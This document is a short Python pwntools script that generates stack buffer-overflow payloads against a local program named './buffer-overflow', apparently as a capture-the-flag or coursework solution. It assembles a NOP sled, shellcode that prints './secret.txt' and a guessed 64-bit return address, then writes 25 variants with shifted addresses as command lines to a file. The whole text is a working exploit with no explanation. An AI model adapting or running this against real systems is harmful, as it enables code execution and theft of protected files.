from pwn import *

context.update(arch='amd64', os='linux')

nop = asm(shellcraft.nop())
code = asm(shellcraft.cat('./secret.txt\n'))
program_name = "./buffer-overflow"
addr_offset = 140
addr = 0xffffffffffffe300 - 200

bytes = addr_offset - len(code)
sled = int(bytes / 3 * 2)
rem = bytes - sled

f = open("./output", "w")
lines = ""

for x in range(25):
    shc = nop * sled + code + nop * rem + p64(addr + 16 * x)
    lines += f"""{program_name} ${str(shc)[1:]}\n"""

f.write(lines)
f.close()
